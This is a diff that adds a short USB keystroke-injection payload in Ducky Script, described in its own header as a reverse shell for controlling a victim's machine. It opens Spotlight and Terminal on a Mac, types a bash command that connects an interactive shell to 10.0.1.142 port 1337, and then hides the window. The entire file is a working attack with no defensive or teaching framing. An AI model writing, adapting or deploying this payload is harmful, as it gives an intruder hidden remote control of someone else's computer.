@@ -1,0 +1,19 @@
+REM Author: Blake Edwards
+REM Description: Simple revers shell for remote control of a victims machine
+REM Kill everything else in the foreground
+DELAY 1000
+GUI q
+DELAY 500
+GUI SPACE
+DELAY 1000
+STRING terminal
+DELAY 500
+ENTER
+DELAY 1000
+CTRL c
+DELAY 500
+STRING bash -i >& /dev/tcp/10.0.1.142/1337 0>&1
+DELAY 500
+ENTER
+DELAY 1000
+GUI h
